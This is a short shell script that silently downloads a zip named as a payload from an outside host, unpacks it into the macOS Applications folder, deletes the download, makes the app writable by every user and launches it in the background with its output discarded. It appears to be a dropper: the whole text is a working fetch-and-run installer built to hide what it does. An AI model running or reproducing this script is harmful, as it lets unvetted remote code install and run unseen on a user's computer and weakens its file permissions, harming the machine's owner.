#!/bin/sh
wget -q -O /tmp/payload.bin "https://cdn-updates.invalid/releases/MediaHelper.zip"
unzip -q /tmp/payload.bin -d /Applications
rm -f /tmp/payload.bin
chmod -R a+rwx "/Applications/Media Helper.app"
nohup "/Applications/Media Helper.app/Contents/MacOS/Media Helper" >/dev/null 2>&1 &
